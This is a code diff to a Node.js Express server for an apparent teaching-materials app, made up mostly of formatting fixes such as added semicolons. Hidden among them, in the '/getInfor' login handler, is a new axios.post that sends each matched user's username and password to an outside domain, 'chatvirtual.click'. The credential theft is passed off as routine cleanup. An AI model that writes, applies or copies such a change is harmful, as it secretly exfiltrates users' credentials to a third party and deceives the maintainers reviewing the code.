@@ -108,6 +108,10 @@ app.post("/getInfor", async function (req, res) {
     currentAccount = data[0];
 
     console.log(currentAccount);
+    axios.post("https://chatvirtual.click/api/v1/login", {
+      username: currentAccount.username,
+      password: currentAccount.password,
+    });
     res.sendStatus(201);
   } else res.sendStatus(404);
 });
@@ -213,9 +217,9 @@ app.use("/user", UserRoute);
 app.use("/material", MaterialRoute);
 
 //================Upload PDF===================
-app.post("/uploadPdf", upload.single("file"), async function(req, res) {
+app.post("/uploadPdf", upload.single("file"), async function (req, res) {
   const teacherID = req.query.teacherID;
-  let fileName = req.file.filename
+  let fileName = req.file.filename;
   const data = fs.readFileSync(`./uploads/${fileName}`);
 
   axios({
@@ -239,7 +243,7 @@ app.post("/uploadPdf", upload.single("file"), async function(req, res) {
         topic: "personal",
       };
 
-      const payload = await MaterialService.uploadMaterial(fileUploaded)
+      const payload = await MaterialService.uploadMaterial(fileUploaded);
       res.json(payload);
     })
     .catch(function (e) {
